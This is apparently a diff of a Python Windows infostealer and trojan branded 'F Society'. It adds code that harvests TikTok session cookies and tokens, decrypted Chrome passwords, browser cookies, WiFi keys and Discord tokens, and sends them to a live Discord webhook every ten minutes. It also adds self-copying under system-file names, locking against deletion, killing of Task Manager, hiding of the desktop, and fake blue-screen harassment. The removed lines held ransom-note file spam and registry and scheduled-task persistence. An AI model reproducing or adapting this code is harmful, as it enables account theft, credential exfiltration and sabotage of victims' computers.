@@ -11,16 +11,20 @@ import base64
 import random
 import threading
 import tkinter as tk
+from tkinter import messagebox
 from datetime import datetime
 from threading import Thread
 import tempfile
 import winreg
 import platform
 import re
+import stat
+import psutil
+import winsound
+import glob
 
 # ==================== HIDE CONSOLE WINDOW ====================
 def hide_console():
-    """Hide the console window completely"""
     if sys.platform == 'win32':
         try:
             console_window = ctypes.windll.kernel32.GetConsoleWindow()
@@ -31,7 +35,6 @@ def hide_console():
 
 # ==================== REQUEST ADMIN PERMISSION ====================
 def request_admin():
-    """Request administrator privileges"""
     if sys.platform == 'win32':
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin()
@@ -50,15 +53,10 @@ time.sleep(1)
 
 # ==================== INSTALL MODULES ====================
 def install_modules():
-    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32']
+    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32', 'psutil', 'cryptography']
     for module in modules:
         try:
-            if module == 'pillow':
-                __import__('PIL')
-            elif module == 'browser_cookie3':
-                __import__('browser_cookie3')
-            else:
-                __import__(module)
+            __import__(module)
         except ImportError:
             subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)
 
@@ -75,370 +73,230 @@ from Crypto.Cipher import AES
 import win32crypt
 import win32api
 import win32con
+import win32file
+import win32security
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 # Configuration
-WEBHOOK_URL = "https://discord.com/api/webhooks/1502233694276947978/1xEeJj4U5ovs9GgMh2hApXXXuoL1DcE1Dl-O_x-C5m6gbsTRM6x6RwUM7gT1IPHZmWHc"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1502198949627433062/78JgZX_0xKIjtYwKAudKXkYQcnWQeD0WC435VTjoMhR9gzxGfEQNbb4396rTYCYFRRxI"
 SCREENSHOT_INTERVAL = 120
 
 mouse = MouseController()
 keyboard = KeyboardController()
 
-# ==================== F SOCIETY TEXT FILES EVERYWHERE ====================
+SCRIPT_PATH = os.path.abspath(sys.argv[0])
+SCRIPT_DIR = os.path.dirname(SCRIPT_PATH)
 
-def create_fsociety_text_files():
-    """Create plain text files everywhere with F Society message"""
+running = True
+duplicate_locations = []
+
+# ==================== TIKTOK ACCOUNT SCRAPER ====================
+
+def get_tiktok_cookies():
+    """Extract TikTok cookies from browsers"""
+    tiktok_accounts = []
+    try:
+        # Chrome TikTok cookies
+        for cookie in browser_cookie3.chrome():
+            if 'tiktok.com' in cookie.domain:
+                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
+                    tiktok_accounts.append({
+                        'platform': 'Chrome',
+                        'cookie_name': cookie.name,
+                        'cookie_value': cookie.value[:50],
+                        'domain': cookie.domain
+                    })
+    except:
+        pass
     
-    # The message content (plain text, no ASCII art)
-    message_content = """We're F SOCIETY
-We are always watching.
+    # Edge TikTok cookies
+    try:
+        for cookie in browser_cookie3.edge():
+            if 'tiktok.com' in cookie.domain:
+                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
+                    tiktok_accounts.append({
+                        'platform': 'Edge',
+                        'cookie_name': cookie.name,
+                        'cookie_value': cookie.value[:50],
+                        'domain': cookie.domain
+                    })
+    except:
+        pass
+    
+    # Firefox TikTok cookies
+    try:
+        for cookie in browser_cookie3.firefox():
+            if 'tiktok.com' in cookie.domain:
+                if 'sessionid' in cookie.name or 'session' in cookie.name.lower():
+                    tiktok_accounts.append({
+                        'platform': 'Firefox',
+                        'cookie_name': cookie.name,
+                        'cookie_value': cookie.value[:50],
+                        'domain': cookie.domain
+                    })
+    except:
+        pass
+    
+    return tiktok_accounts
 
-Your system has been compromised.
-All your data has been accessed.
-
-- F Society"""
-
-    # List of locations to create the file
-    locations = [
-        # Desktop paths
-        os.path.expanduser('~') + '\\Desktop\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\Desktop\\IMPORTANT_READ.txt',
-        os.path.expanduser('~') + '\\Desktop\\README.txt',
-        
-        # Documents paths
-        os.path.expanduser('~') + '\\Documents\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\Documents\\URGENT.txt',
-        os.path.expanduser('~') + '\\Documents\\WARNING.txt',
-        
-        # Downloads path
-        os.path.expanduser('~') + '\\Downloads\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\Downloads\\READ_THIS.txt',
-        
-        # Music, Pictures, Videos
-        os.path.expanduser('~') + '\\Music\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\Pictures\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\Videos\\FSOCIETY.txt',
-        
-        # Root of C drive
-        'C:\\FSOCIETY.txt',
-        'C:\\Windows\\Temp\\FSOCIETY.txt',
-        
-        # System32 (if admin)
-        'C:\\Windows\\System32\\FSOCIETY.txt',
-        'C:\\Windows\\SysWOW64\\FSOCIETY.txt',
-        
-        # Program Files
-        'C:\\Program Files\\FSOCIETY.txt',
-        'C:\\Program Files (x86)\\FSOCIETY.txt',
-        
-        # Temp directory
-        os.path.join(tempfile.gettempdir(), 'FSOCIETY.txt'),
-        
-        # Startup folder (so it opens on boot)
-        os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\FSOCIETY.txt',
-        
-        # Recent folder
-        os.path.expanduser('~') + '\\Recent\\FSOCIETY.txt',
-        
-        # Saved Games
-        os.path.expanduser('~') + '\\Saved Games\\FSOCIETY.txt',
-        
-        # Contacts
-        os.path.expanduser('~') + '\\Contacts\\FSOCIETY.txt',
-        
-        # Links
-        os.path.expanduser('~') + '\\Links\\FSOCIETY.txt',
-        
-        # Search history folder
-        os.path.expanduser('~') + '\\Searches\\FSOCIETY.txt',
-        
-        # OneDrive folders
-        os.path.expanduser('~') + '\\OneDrive\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\OneDrive\\Desktop\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\OneDrive\\Documents\\FSOCIETY.txt',
-        
-        # AppData folders
-        os.path.expanduser('~') + '\\AppData\\Local\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\AppData\\Roaming\\FSOCIETY.txt',
-        os.path.expanduser('~') + '\\AppData\\LocalLow\\FSOCIETY.txt',
-        
-        # Create in every available drive (D:, E:, F:, etc.)
+def get_tiktok_local_storage():
+    """Extract TikTok local storage data"""
+    tiktok_data = []
+    paths = [
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb',
+        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb',
+        os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
     ]
     
-    # Get all drive letters
-    import string
-    for drive in string.ascii_uppercase:
-        drive_path = f"{drive}:\\FSOCIETY.txt"
-        if os.path.exists(f"{drive}:\\"):
-            locations.append(drive_path)
-    
-    # Create files
-    created_count = 0
-    for location in locations:
+    for path in paths:
         try:
-            # Create directory if it doesn't exist
-            directory = os.path.dirname(location)
-            if directory and not os.path.exists(directory):
-                try:
-                    os.makedirs(directory, exist_ok=True)
-                except:
-                    pass
-            
-            # Write the message
-            with open(location, 'w', encoding='utf-8') as f:
-                f.write(message_content)
-            
-            # Set file to hidden
-            try:
-                ctypes.windll.kernel32.SetFileAttributesW(location, 0x02)
-            except:
-                pass
-            
-            created_count += 1
-            print(f"[+] Created: {location}")
-        except Exception as e:
-            pass
-    
-    # Also find all folders and add a copy
-    try:
-        # Add to every user folder
-        user_path = os.path.expanduser('~')
-        for root, dirs, files in os.walk(user_path):
-            try:
-                if random.random() < 0.1:  # 10% chance to add to folder
-                    file_path = os.path.join(root, 'READ_THIS.txt')
-                    with open(file_path, 'w', encoding='utf-8') as f:
-                        f.write(message_content)
-                    created_count += 1
-            except:
-                pass
-            if created_count > 500:  # Limit to 500 files
-                break
-    except:
-        pass
-    
-    print(f"[+] Created {created_count} F SOCIETY text files across the system")
-    return created_count
-
-def open_mr_robot_picture():
-    """Open Mr. Robot face picture in browser"""
-    try:
-        # High quality Mr. Robot images
-        mr_robot_urls = [
-            "https://i.imgur.com/6qF8W3X.jpg",   # Mr. Robot mask
-            "https://i.imgur.com/HgJ8kR9.jpg",   # Rami Malek as Mr. Robot
-            "https://i.imgur.com/klXzQpL.jpg",   # F Society mask
-            "https://i.imgur.com/RtY3KwB.jpg",   # Mr. Robot hacker
-            "https://i.imgur.com/XwVdTmB.jpg",   # fsociety mask group
-            "https://i.imgur.com/5NQ4K2L.jpg",   # Elliot and Mr. Robot
-            "https://i.imgur.com/1RtKqJf.jpg",   # Mr. Robot face closeup
-            "https://i.imgur.com/pQYLnFx.jpg",   # fsociety logo
-            "https://i.imgur.com/9VwMkGj.jpg",   # Mr. Robot typing
-            "https://i.imgur.com/2XtZnEm.jpg",   # Elliot Alderson
-        ]
-        
-        # Open multiple tabs with Mr. Robot images
-        for _ in range(5):  # Open 5 tabs of Mr. Robot
-            url = random.choice(mr_robot_urls)
-            os.system(f'start {url}')
-            time.sleep(1)
-        
-        print("[+] Opened Mr. Robot pictures in browser")
-        
-        # Also open a search result
-        os.system('start https://www.google.com/search?q=Mr+Robot+face&tbm=isch')
-        
-    except Exception as e:
-        print(f"[-] Error opening pictures: {e}")
-
-# ==================== RENAME SELF TO SYSTEM FILE ====================
-def rename_to_system_file():
-    """Rename the script to look like a Windows system file"""
-    try:
-        current_path = os.path.abspath(sys.argv[0])
-        system_dirs = [
-            os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\',
-            os.environ.get('SystemRoot', 'C:\\Windows') + '\\',
-        ]
-        
-        system_names = [
-            'svchost.exe', 'winlogon.exe', 'csrss.exe', 'lsass.exe', 
-            'services.exe', 'wininit.exe', 'spoolsv.exe'
-        ]
-        
-        for sys_dir in system_dirs:
-            try:
-                if os.path.exists(sys_dir):
-                    new_name = random.choice(system_names)
-                    new_path = os.path.join(sys_dir, new_name)
-                    
-                    if os.path.exists(new_path):
-                        new_name = f"sys{random.randint(1000,9999)}.exe"
-                        new_path = os.path.join(sys_dir, new_name)
-                    
-                    shutil.copy2(current_path, new_path)
-                    ctypes.windll.kernel32.SetFileAttributesW(new_path, 0x02)
-                    add_to_startup(new_path)
-                    create_scheduled_task(new_path)
-                    return new_path
-            except:
-                pass
-    except:
-        pass
-    return None
-
-# ==================== PERSISTENCE METHODS ====================
-def add_to_startup(file_path):
-    try:
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
-            winreg.SetValueEx(registry_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{file_path}"')
-    except:
-        pass
-
-def create_scheduled_task(file_path):
-    try:
-        subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdateTask', '/tr', file_path, 
-                       '/sc', 'onlogon', '/f', '/rl', 'HIGHEST'], capture_output=True)
-    except:
-        pass
-
-def add_multiple_startup_methods():
-    script_path = os.path.abspath(sys.argv[0])
-    python_exe = sys.executable
-    
-    try:
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
-            winreg.SetValueEx(registry_key, "WindowsUpdateService", 0, winreg.REG_SZ, 
-                            f'"{python_exe}" "{script_path}"')
-    except:
-        pass
-    
-    try:
-        startup_folder = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
-        vbs_path = os.path.join(startup_folder, "WindowsUpdate.vbs")
-        vbs_content = f'''CreateObject("Wscript.Shell").Run "{python_exe} {script_path}", 0, False'''
-        with open(vbs_path, 'w') as f:
-            f.write(vbs_content)
-    except:
-        pass
-
-# ==================== MESSAGE BOX SPAM ====================
-message_boxes = []
-
-class DoublingMessageBox:
-    def __init__(self):
-        self.window = None
-        
-    def create(self):
-        try:
-            dialog = tk.Toplevel()
-            dialog.title("⚠️ F SOCIETY")
-            dialog.geometry("400x200")
-            dialog.configure(bg='#1e1e1e')
-            dialog.resizable(False, False)
-            
-            screen_width = dialog.winfo_screenwidth()
-            screen_height = dialog.winfo_screenheight()
-            x = random.randint(50, screen_width - 450)
-            y = random.randint(50, screen_height - 250)
-            dialog.geometry(f"400x200+{x}+{y}")
-            dialog.attributes('-topmost', True)
-            
-            tk.Label(dialog, text="⚠️", font=("Segoe UI", 48), fg="#ff4444", bg='#1e1e1e').pack(pady=10)
-            tk.Label(dialog, text="We're F SOCIETY", font=("Segoe UI", 20, "bold"), 
-                    fg="#ff4444", bg='#1e1e1e').pack(pady=5)
-            tk.Label(dialog, text="We are always watching", font=("Segoe UI", 12), 
-                    fg="#888888", bg='#1e1e1e').pack()
-            
-            def on_exit():
-                for _ in range(2):
-                    new_box = DoublingMessageBox()
-                    new_box.create()
-            
-            exit_button = tk.Button(dialog, text="EXIT", command=on_exit, 
-                                    font=("Segoe UI", 12, "bold"), bg="#ff4444", fg="white",
-                                    activebackground="#cc0000", cursor="hand2", width=10)
-            exit_button.pack(pady=20)
-            dialog.protocol("WM_DELETE_WINDOW", on_exit)
-            
-            self.window = dialog
-            dialog.mainloop()
+            if os.path.exists(path):
+                for root, dirs, files in os.walk(path):
+                    for file in files:
+                        if file.endswith('.log') or file.endswith('.ldb'):
+                            file_path = os.path.join(root, file)
+                            try:
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    # Look for TikTok usernames and user IDs
+                                    username_patterns = [
+                                        r'uniqueId":"([^"]+)"',
+                                        r'nickname":"([^"]+)"',
+                                        r'secUid":"([^"]+)"',
+                                        r'uid":"(\d+)"',
+                                        r'user_id":(\d+)',
+                                        r'username":"([^"]+)"'
+                                    ]
+                                    for pattern in username_patterns:
+                                        matches = re.findall(pattern, content)
+                                        for match in matches:
+                                            if match and len(match) > 2:
+                                                tiktok_data.append(f"📱 TikTok Data: {match}")
+                            except:
+                                pass
         except:
             pass
+    
+    return tiktok_data
 
-def create_message_box():
-    box = DoublingMessageBox()
-    Thread(target=box.create, daemon=True).start()
-    time.sleep(0.2)
-
-def auto_message_box_loop():
-    while True:
-        time.sleep(8)
-        create_message_box()
-
-# ==================== SCREEN DRAWING ====================
-drawing = True
-current_color = (255, 0, 0)
-overlay_root = None
-canvas = None
-
-def create_transparent_overlay():
-    global overlay_root, canvas
-    overlay_root = tk.Tk()
-    overlay_root.attributes('-fullscreen', True)
-    overlay_root.attributes('-topmost', True)
-    overlay_root.attributes('-transparentcolor', 'white')
-    overlay_root.configure(bg='white')
-    overlay_root.overrideredirect(True)
-    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
-    canvas.pack(fill=tk.BOTH, expand=True)
-    overlay_root.update()
-
-def auto_change_color():
-    colors = [(255,0,0), (0,255,0), (0,0,255), (255,255,0), (255,0,255), (0,255,255)]
-    color_index = 0
-    global current_color
-    while True:
-        time.sleep(5)
-        color_index = (color_index + 1) % len(colors)
-        current_color = colors[color_index]
-
-def draw_on_screen(x, y):
-    if drawing and canvas:
-        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
-        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
-        overlay_root.update()
-
-def on_move(x, y):
-    draw_on_screen(x, y)
-
-# ==================== SCREEN ROTATION ====================
-def rotate_screen_upside_down():
-    try:
-        devmode = win32api.EnumDisplaySettings(None, 0)
-        devmode.DisplayOrientation = 2
-        devmode.Fields = win32con.DM_DISPLAYORIENTATION
-        win32api.ChangeDisplaySettings(devmode, 0)
-    except:
-        pass
-
-def screen_flicker_auto():
-    for _ in range(10):
+def get_tiktok_session_files():
+    """Find TikTok session files on disk"""
+    session_files = []
+    search_paths = [
+        os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache',
+        os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache',
+        os.path.expanduser('~') + '\\AppData\\Local\\Temp',
+        os.path.expanduser('~') + '\\Downloads',
+    ]
+    
+    for search_path in search_paths:
         try:
-            devmode = win32api.EnumDisplaySettings(None, 0)
-            devmode.DisplayOrientation = 2
-            win32api.ChangeDisplaySettings(devmode, 0)
-            time.sleep(0.05)
-            devmode.DisplayOrientation = 0
-            win32api.ChangeDisplaySettings(devmode, 0)
-            time.sleep(0.05)
+            for root, dirs, files in os.walk(search_path):
+                for file in files:
+                    if 'tiktok' in file.lower():
+                        session_files.append(f"📁 TikTok file: {os.path.join(root, file)}")
         except:
             pass
+    
+    return session_files
 
-# ==================== CREDENTIAL STEALING ====================
+def get_tiktok_usernames_from_history():
+    """Extract TikTok usernames from browser history"""
+    usernames = []
+    history_paths = [
+        os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History',
+        os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\History',
+    ]
+    
+    for history_path in history_paths:
+        try:
+            if os.path.exists(history_path):
+                temp_db = tempfile.NamedTemporaryFile(delete=False)
+                shutil.copy2(history_path, temp_db.name)
+                temp_db.close()
+                
+                conn = sqlite3.connect(temp_db.name)
+                cursor = conn.cursor()
+                cursor.execute('SELECT url, title FROM urls WHERE url LIKE "%tiktok.com/@"%')
+                
+                for row in cursor.fetchall():
+                    url = row[0]
+                    title = row[1]
+                    # Extract username from URL
+                    match = re.search(r'tiktok\.com/@([^/?]+)', url)
+                    if match:
+                        username = match.group(1)
+                        usernames.append(f"📱 TikTok User: @{username} (from: {url[:100]})")
+                    if title and 'tiktok' in title.lower():
+                        usernames.append(f"📱 TikTok Title: {title[:100]}")
+                
+                conn.close()
+                os.unlink(temp_db.name)
+        except:
+            pass
+    
+    return list(set(usernames))
+
+def get_tiktok_api_tokens():
+    """Extract TikTok API tokens from browsers"""
+    tokens = []
+    token_patterns = [
+        r'sessionid=([a-zA-Z0-9_-]+)',
+        r'msToken=([a-zA-Z0-9_-]+)',
+        r'tt_webid=([a-zA-Z0-9_-]+)',
+        r'passport_csrf_token=([a-zA-Z0-9_-]+)',
+    ]
+    
+    try:
+        for cookie in browser_cookie3.chrome():
+            if 'tiktok' in cookie.domain:
+                for pattern in token_patterns:
+                    if re.search(pattern, cookie.value):
+                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
+    except:
+        pass
+    
+    try:
+        for cookie in browser_cookie3.edge():
+            if 'tiktok' in cookie.domain:
+                for pattern in token_patterns:
+                    if re.search(pattern, cookie.value):
+                        tokens.append(f"🔑 TikTok Token: {cookie.name}={cookie.value[:50]}")
+    except:
+        pass
+    
+    return tokens
+
+def collect_tiktok_data():
+    """Collect all TikTok related data"""
+    tiktok_data = []
+    
+    print("[+] Scraping TikTok cookies...")
+    cookies = get_tiktok_cookies()
+    for cookie in cookies:
+        tiktok_data.append(f"🍪 {cookie['platform']} TikTok Cookie: {cookie['cookie_name']} = {cookie['cookie_value']}...")
+    
+    print("[+] Scraping TikTok local storage...")
+    local_data = get_tiktok_local_storage()
+    tiktok_data.extend(local_data)
+    
+    print("[+] Scraping TikTok session files...")
+    session_files = get_tiktok_session_files()
+    tiktok_data.extend(session_files)
+    
+    print("[+] Extracting TikTok usernames from history...")
+    usernames = get_tiktok_usernames_from_history()
+    tiktok_data.extend(usernames)
+    
+    print("[+] Extracting TikTok API tokens...")
+    tokens = get_tiktok_api_tokens()
+    tiktok_data.extend(tokens)
+    
+    return tiktok_data
+
+# ==================== DATA SCRAPING FUNCTIONS ====================
+
 def get_chrome_master_key():
     try:
         local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
@@ -486,12 +344,26 @@ def get_all_passwords():
                 if username and encrypted_pass and master_key:
                     password = decrypt_chrome_password(encrypted_pass, master_key)
                     if password:
-                        passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`\n")
+                        passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`")
             conn.close()
             os.unlink(temp_db.name)
     except:
         pass
     return passwords
+
+def get_all_cookies():
+    cookies = []
+    try:
+        for cookie in browser_cookie3.chrome():
+            cookies.append(f"🍪 Chrome: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
+    except:
+        pass
+    try:
+        for cookie in browser_cookie3.edge():
+            cookies.append(f"🍪 Edge: {cookie.domain} | {cookie.name} = {cookie.value[:50]}")
+    except:
+        pass
+    return cookies[:50]
 
 def get_wifi_passwords():
     wifi_list = []
@@ -503,7 +375,7 @@ def get_wifi_passwords():
             for line in result.stdout.split('\n'):
                 if 'Key Content' in line:
                     password = line.split(':')[1].strip()
-                    wifi_list.append(f"✅ WiFi: {profile}\n   🔐 `{password}`\n")
+                    wifi_list.append(f"📡 WiFi: {profile}\n   🔐 `{password}`")
                     break
     except:
         pass
@@ -511,7 +383,9 @@ def get_wifi_passwords():
 
 def get_discord_tokens():
     tokens = []
-    paths = [os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb']
+    paths = [
+        os.path.expanduser('~') + r'\AppData\Roaming\Discord\Local Storage\leveldb',
+    ]
     token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
     for path in paths:
         try:
@@ -552,109 +426,319 @@ def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
     except:
         return False
 
-def collect_and_send_data():
+def collect_all_data():
+    """Collect ALL data including TikTok accounts"""
     sys_info = get_system_info()
-    message = f"**[🔴 F SOCIETY - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
+    
+    message = f"**[🔴 F SOCIETY - DATA BREACH - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
     message += f"💻 PC: {sys_info['computer']}\n"
     message += f"👤 User: {sys_info['user']}\n"
     message += f"🖥️ OS: {sys_info['os']}\n"
     message += f"🌐 IP: {sys_info['ip']}\n"
     message += f"{'='*60}\n\n"
+    
+    # TikTok Accounts
+    print("[+] Collecting TikTok accounts...")
+    message += "**📱 TIKTOK ACCOUNTS & DATA:**\n"
+    tiktok_data = collect_tiktok_data()
+    if tiktok_data:
+        for data in tiktok_data[:30]:
+            message += f"{data}\n"
+    else:
+        message += "No TikTok data found\n"
+    message += "\n"
+    
+    # Passwords
+    print("[+] Collecting passwords...")
     message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
-    for pwd in get_all_passwords():
-        message += pwd
-    message += "\n**📡 WIFI PASSWORDS:**\n"
+    for pwd in get_all_passwords()[:20]:
+        message += f"{pwd}\n"
+    message += "\n"
+    
+    # Cookies
+    print("[+] Collecting cookies...")
+    message += "**🍪 BROWSER COOKIES:**\n"
+    for cookie in get_all_cookies()[:30]:
+        message += f"{cookie}\n"
+    message += "\n"
+    
+    # WiFi passwords
+    print("[+] Collecting WiFi passwords...")
+    message += "**📡 WIFI PASSWORDS:**\n"
     for wifi in get_wifi_passwords():
-        message += wifi
-    message += "\n**🎮 DISCORD TOKENS:**\n"
+        message += f"{wifi}\n"
+    message += "\n"
+    
+    # Discord tokens
+    print("[+] Collecting Discord tokens...")
+    message += "**🎮 DISCORD TOKENS:**\n"
     for token in get_discord_tokens()[:5]:
         message += f"✅ `{token}`\n"
+    message += "\n"
+    
     send_to_webhook(message)
+    print("[+] All data sent to webhook!")
 
-# ==================== SCREENSHOT WORKER ====================
-def screenshot_worker():
-    while True:
+def continuous_data_collection():
+    """Collect and send data every 10 minutes"""
+    while running:
+        collect_all_data()
+        time.sleep(600)  # Every 10 minutes
+
+# ==================== ANTI-DELETION & PERSISTENCE ====================
+
+def make_file_completely_undeletable(file_path):
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04 | 0x01)
+        f = open(file_path, 'r+b')
+        import msvcrt
+        msvcrt.locking(f.fileno(), msvcrt.LK_LOCK, 1000000)
+        print(f"[+] Protected: {file_path}")
+        return True
+    except:
+        return False
+
+def create_multiple_copies():
+    critical_paths = [
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\svchost.exe',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32\\winlogon.exe',
+        os.environ.get('SystemRoot', 'C:\\Windows') + '\\explorer.exe',
+        os.environ.get('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe',
+        os.path.expanduser('~') + '\\Desktop\\svchost.exe',
+    ]
+    for path in critical_paths:
         try:
-            screenshot = pyautogui.screenshot()
-            img_bytes = io.BytesIO()
-            screenshot.save(img_bytes, format='JPEG', quality=60)
-            img_bytes.seek(0)
-            sys_info = get_system_info()
-            filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-            send_to_webhook(None, True, img_bytes.getvalue(), filename)
-            time.sleep(SCREENSHOT_INTERVAL)
+            if not os.path.exists(path):
+                shutil.copy2(SCRIPT_PATH, path)
+                make_file_completely_undeletable(path)
+                duplicate_locations.append(path)
+        except:
+            pass
+
+def persistent_anti_deletion_loop():
+    while running:
+        try:
+            if not os.path.exists(SCRIPT_PATH):
+                for loc in duplicate_locations:
+                    if os.path.exists(loc):
+                        shutil.copy2(loc, SCRIPT_PATH)
+                        break
+            make_file_completely_undeletable(SCRIPT_PATH)
+            time.sleep(5)
+        except:
+            time.sleep(2)
+
+# ==================== SOUND SPAM ====================
+def sound_spam_forever():
+    frequencies = [300, 500, 700, 900, 1100, 1300, 1500, 1700, 2000]
+    while running:
+        try:
+            freq = random.choice(frequencies)
+            duration = random.randint(100, 500)
+            winsound.Beep(freq, duration)
+            time.sleep(random.uniform(0.5, 2))
+        except:
+            time.sleep(1)
+
+# ==================== TASK MANAGER KILLER ====================
+def task_manager_killer_forever():
+    blocked = ['taskmgr.exe', 'procexp.exe', 'procmon.exe', 'regedit.exe']
+    while running:
+        try:
+            for proc in psutil.process_iter(['name']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() in blocked:
+                        proc.kill()
+                except:
+                    pass
+            time.sleep(0.5)
+        except:
+            time.sleep(1)
+
+# ==================== HIDE DESKTOP ====================
+def hide_desktop_elements_forever():
+    while running:
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            policies = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+            with winreg.CreateKey(key, policies) as reg_key:
+                winreg.SetValueEx(reg_key, "NoDesktop", 0, winreg.REG_DWORD, 1)
+                winreg.SetValueEx(reg_key, "NoTaskbar", 0, winreg.REG_DWORD, 1)
+            subprocess.run(['taskkill', '/f', '/im', 'explorer.exe'], capture_output=True)
+            time.sleep(1)
+            subprocess.run(['start', 'explorer.exe'], capture_output=True)
+            time.sleep(30)
         except:
             time.sleep(5)
 
-# ==================== FAKE BSOD ====================
-def fake_bsod_auto():
-    time.sleep(20)
+# ==================== CURSOR TELEPORT ====================
+def cursor_teleport_forever():
+    while running:
+        try:
+            screen_width = pyautogui.size().width
+            screen_height = pyautogui.size().height
+            positions = [
+                (10, 10), (screen_width - 10, 10), (10, screen_height - 10),
+                (screen_width - 10, screen_height - 10), (screen_width // 2, screen_height // 2)
+            ]
+            pos = random.choice(positions)
+            pyautogui.moveTo(pos[0], pos[1], duration=0.05)
+            time.sleep(random.uniform(1, 4))
+        except:
+            time.sleep(1)
+
+# ==================== WINDOW SHAKER ====================
+def window_shaker_forever():
+    while running:
+        try:
+            hwnds = []
+            def enum_callback(hwnd, hwnds):
+                if ctypes.windll.user32.IsWindowVisible(hwnd):
+                    hwnds.append(hwnd)
+                return True
+            EnumWindows = ctypes.windll.user32.EnumWindows
+            EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
+            EnumWindows(EnumWindowsProc(enum_callback), 0)
+            if hwnds:
+                for hwnd in random.sample(hwnds, min(5, len(hwnds))):
+                    for _ in range(10):
+                        rect = ctypes.windll.user32.GetWindowRect(hwnd)
+                        x, y = random.randint(-5, 5), random.randint(-5, 5)
+                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0002 | 0x0001)
+                        time.sleep(0.02)
+            time.sleep(random.uniform(5, 15))
+        except:
+            time.sleep(5)
+
+# ==================== PERSISTENT BSOD ====================
+def persistent_bsod_after_reboot():
+    while running:
+        try:
+            bsod = tk.Tk()
+            bsod.attributes('-fullscreen', True)
+            bsod.configure(bg='#0000AA')
+            bsod.attributes('-topmost', True)
+            frame = tk.Frame(bsod, bg='#0000AA')
+            frame.pack(expand=True)
+            tk.Label(frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA').pack(pady=50)
+            error_text = """F SOCIETY - Your system has been compromised
+
+Your TikTok accounts are stolen.
+Your passwords are compromised.
+Your system is under our control.
+
+Stop code: F_SOCIETY_ALWAYS_WATCHING"""
+            tk.Label(frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT).pack(pady=20)
+            bsod.after(3000, bsod.destroy)
+            bsod.mainloop()
+            time.sleep(random.uniform(10, 30))
+        except:
+            time.sleep(5)
+
+# ==================== SCREEN DRAWING ====================
+drawing = True
+current_color = (255, 0, 0)
+overlay_root = None
+canvas = None
+
+def create_transparent_overlay():
+    global overlay_root, canvas
+    overlay_root = tk.Tk()
+    overlay_root.attributes('-fullscreen', True)
+    overlay_root.attributes('-topmost', True)
+    overlay_root.attributes('-transparentcolor', 'white')
+    overlay_root.configure(bg='white')
+    overlay_root.overrideredirect(True)
